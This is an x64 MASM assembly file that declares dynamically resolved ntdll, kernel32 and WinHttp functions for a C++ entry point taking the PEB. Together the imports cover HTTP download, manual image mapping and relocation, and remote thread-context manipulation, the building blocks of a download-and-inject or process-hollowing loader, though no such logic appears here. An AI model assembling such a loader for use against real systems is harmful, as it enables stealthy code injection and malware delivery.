.code

; void __cdecl ep(struct _PEB *)
extern ?ep@@YAXPEAU_PEB@@@Z : PROC

epASM proc
	jmp ?ep@@YAXPEAU_PEB@@@Z
epASM endp

include <nobase64.inc>

HMOD kernel32
HMOD WinHttp

createFunc ntdll, DbgPrint
createFunc ntdll, wcstoul
createFunc ntdll, memset
createFunc ntdll, memcpy

createFunc ntdll, LdrGetProcedureAddress
createFunc ntdll, LdrLoadDll
createFunc ntdll, LdrUnloadDll
createFunc ntdll, LdrGetDllHandle
createFunc ntdll, LdrProcessRelocationBlock

createFunc ntdll, NtCreateSection
createFunc ntdll, ZwMapViewOfSection
createFunc ntdll, ZwUnmapViewOfSection
createFunc ntdll, ZwProtectVirtualMemory

createFunc ntdll, NtOpenFile
createFunc ntdll, NtQueryDirectoryFile
createFunc ntdll, NtClose

createFunc ntdll, NtFreeVirtualMemory

createFunc ntdll, NtQueryInformationProcess
createFunc ntdll, ZwQueryInformationThread
createFunc ntdll, ZwSetInformationThread
createFunc ntdll, ZwSetContextThread
createFunc ntdll, ZwGetContextThread
createFunc ntdll, ZwResumeThread

createFunc ntdll, ZwReadVirtualMemory
createFunc ntdll, ZwWriteVirtualMemory

createFunc ntdll, RtlInitAnsiString
createFunc ntdll, RtlInitUnicodeString
createFunc ntdll, RtlEqualUnicodeString
createFunc ntdll, RtlAppendUnicodeStringToString
createFunc ntdll, RtlAppendUnicodeToString
createFunc ntdll, RtlGetNtSystemRoot
createFunc ntdll, RtlDosPathNameToNtPathName_U_WithStatus
createFunc ntdll, RtlFreeUnicodeString

createFunc ntdll, RtlAllocateHeap
createFunc ntdll, RtlFreeHeap

createFunc ntdll, RtlImageNtHeaderEx
createFunc ntdll, RtlImageNtHeader
createFunc ntdll, RtlImageDirectoryEntryToData

createFunc kernel32, ExitProcess
createFunc kernel32, GetProcessHeap
createFunc kernel32, GetSystemWow64DirectoryW
createFunc kernel32, GetSystemWindowsDirectoryW
createFunc kernel32, VirtualProtect
createFunc kernel32, VirtualProtectEx
createFunc kernel32, TerminateProcess
createFunc kernel32, CreateProcessW

createFunc WinHttp, WinHttpCloseHandle
createFunc WinHttp, WinHttpOpen
createFunc WinHttp, WinHttpConnect
createFunc WinHttp, WinHttpOpenRequest
createFunc WinHttp, WinHttpSendRequest
createFunc WinHttp, WinHttpQueryHeaders
createFunc WinHttp, WinHttpReceiveResponse
createFunc WinHttp, WinHttpReadData

end